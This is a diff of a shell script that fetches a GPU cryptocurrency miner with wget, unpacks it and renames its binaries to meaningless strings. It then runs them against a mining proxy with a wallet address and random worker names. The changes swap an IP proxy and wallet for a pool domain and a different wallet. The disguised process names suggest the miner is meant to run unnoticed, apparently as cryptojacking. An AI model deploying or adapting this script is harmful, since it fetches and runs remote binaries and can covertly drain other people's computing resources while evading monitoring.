@@ -1,10 +1,10 @@
-wget -c https://github.com/rxt36q6/file/releases/download/1/pearlfortune-v2.0.9.tar.gz \
-&& tar vxzf pearlfortune-v2.0.9.tar.gz \
-&& cd pearlfortune \
-&& chmod +x miner-cuda13 miner-cuda12 \
-&& cp miner-cuda13 meiakoskal \
-&& cp miner-cuda12 meiakoska2
+wget -c https://github.com/pearlfortune/pearl-miner/releases/download/v2.2.9/pearlfortune-v2.2.9.tar.gz
+tar vxzf pearlfortune-v2.2.9.tar.gz
+cd pearlfortune
+chmod +x miner-cuda13 miner-cuda12
+cp miner-cuda13 lsokdiosl
+cp miner-cuda12 lsokdios2
 
-./meiakoskal --proxy 152.44.35.192:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
+./lsokdiosl --proxy global.pearlfortune.org:443 --address prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10) -gpu
 
-./meiakoska2 --proxy 152.44.35.192:443 --address prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10) -gpu --tui
+./lsokdios2 --proxy global.pearlfortune.org:443 --address prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10) -gpu
